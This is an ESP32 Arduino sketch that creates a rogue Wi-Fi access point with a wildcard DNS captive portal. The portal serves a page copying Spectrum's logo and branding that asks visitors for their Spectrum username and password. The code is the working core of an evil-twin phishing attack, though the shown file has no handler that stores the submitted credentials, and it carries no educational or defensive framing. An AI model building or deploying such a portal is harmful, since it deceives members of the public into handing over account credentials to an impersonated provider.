#include <AsyncTCP.h>
#include <WiFi.h>
#include "ESPAsyncWebServer.h"
#include <DNSServer.h>
#include <mbedtls/md5.h> // Ensure mbedtls/md5.h is included

const char* accessPointName = "Spectrum Mobile";

DNSServer dnsServer;
AsyncWebServer server(80);

const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
  <head>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        background-color: #f6f8fa;
      }
      .container {
        width: 80%;
        max-width: 300px;
        margin: 10% auto;
        text-align: center;
      }
      .container .logo {
        width: 50%;
        height: auto;
        margin-bottom: 15px;
      }
      .container h1 {
        margin: 5px 0;
      }
      .container p {
        margin: 0;
        font-size: 0.8em;
        color: #666;
      }
      .container form {
        display: flex;
        flex-direction: column;
      }
      .container form input {
        margin: 5px 0;
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 3px;
      }
      .container form button {
        margin: 5px 0;
        padding: 10px;
        color: #fff;
        background-color: #0076bc;
        border: none;
        border-radius: 3px;
        cursor: pointer;
      }
      .container form button:hover {
        background-color: #005999;
      }
    </style>
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, maximum-scale=1"
    />
  </head>
  <body>
    <div class="container">
      <svg
        class="logo"
        xmlns="http://www.w3.org/2000/svg"
        xml:space="preserve"
        viewBox="0 0 1001 209"
      >
        <path fill="#0076BC" d="M934 61v102l67-51z" />
        <path
          fill="#77787B"
          d="M166 193c0 9-6 16-15 16h-16V94c2-30 13-55 59-56 20 0 35 8 44 18 9 12 13 27 13 46s-5 35-14 47c-9 11-21 17-36 17-21 0-32-9-35-10v37m53-90c0-12-2-37-27-37-23 0-26 24-26 37 0 32 18 36 27 36 22 0 26-24 26-36M18 153c11 9 26 13 47 13 20 0 36-4 47-13s16-22 16-38c0-8-1-15-5-21-3-6-8-12-15-15l-12-5-37-10c-15-4-25-9-25-18 1-18 17-19 27-19 9 0 17 2 22 6 10 7 9 17 9 17h31c-1-15-6-28-17-37C96 4 82 0 63 0 43 0 28 4 18 12 7 21 2 33 2 48c0 19 9 30 18 35 5 3 16 8 31 11l12 3c22 5 34 12 34 22 0 7-3 12-8 15-4 3-12 5-21 5-11 0-19-2-25-6s-10-11-11-20H0c1 18 7 31 18 40m296-88c20 0 23 16 23 25h-46s-1-25 23-25m1 74c-8-1-23-2-24-29h79v-9c0-20-5-35-14-46a55 55 0 0 0-43-17c-17 0-31 6-41 17-9 11-14 26-14 46 0 21 5 36 15 47 9 12 23 17 40 17 15 0 27-3 36-10 10-7 16-17 20-30h-28c-4 12-14 14-26 14m533 24h-32V85c0-9-4-21-22-21-17 0-21 13-21 21v78h-32V91c0-21 6-33 16-42 10-8 23-11 36-11l-21 2c-7 2-13 5-18 9-5-4-10-7-17-8-6-2-13-3-19-3-40 0-56 18-57 23v102h-18c-5 0-16-3-16-16V85c0-9-3-21-22-21-18 0-21 13-21 21v78zm-390-38h30s-8 40-54 40c-45 0-56-36-56-60s4-65 55-67c47 0 54 40 54 40h-32s-3-14-22-13c-19 0-24 18-24 35s4 39 25 39c20 0 22-11 24-14m167-84h32v78s-1 21 21 21c21 0 22-19 22-20V56s1-15 15-15h17v72c-1 4 4 52-54 52-56 0-52-48-53-51V41zm-98 33h19V41h-19V21c0-6-3-16-15-16h-17v135c0 14 6 23 18 23h14V74zm53 89v-63c0-9 2-16 6-20 4-5 11-7 20-7h10V41s-16-1-28 3a50 50 0 0 0-35 30c-4 8-6 18-6 30v59h33z"
        />
      </svg>
      <h1>Welcome</h1>
      <p>Please log in using your Spectrum account</p>
      <form action="/get" method="GET">
        <input type="text" name="email" placeholder="Username" required />
        <input
          type="password"
          name="password"
          placeholder="Password"
          required
        />
        <button type="submit">Login</button>
      </form>
    </div>
  </body>
</html>
)rawliteral";

class CaptivePortalHandler : public AsyncWebHandler {
public:
  CaptivePortalHandler() {}
  virtual ~CaptivePortalHandler() {}

  bool canHandle(AsyncWebServerRequest *request){
    return true; // Handle all requests
  }

  void handleRequest(AsyncWebServerRequest *request) {
    // Redirect all requests to the root ("/") to index_html
    request->redirect("/");
  }
};

void setupServer() {
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send_P(200, "text/html", index_html);
  });

  server.onNotFound([](AsyncWebServerRequest *request){
    request->redirect("/");
  });

  server.addHandler(new CaptivePortalHandler()).setFilter(ON_AP_FILTER);
}

void setup() {
  Serial.begin(115200);
  delay(10);

  WiFi.mode(WIFI_AP);
  WiFi.softAP("Captive Portal AP");

  setupServer();

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.setTTL(300);
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.begin();

  Serial.println("Started Captive Portal...");
}

void loop() {
  dnsServer.processNextRequest();
}
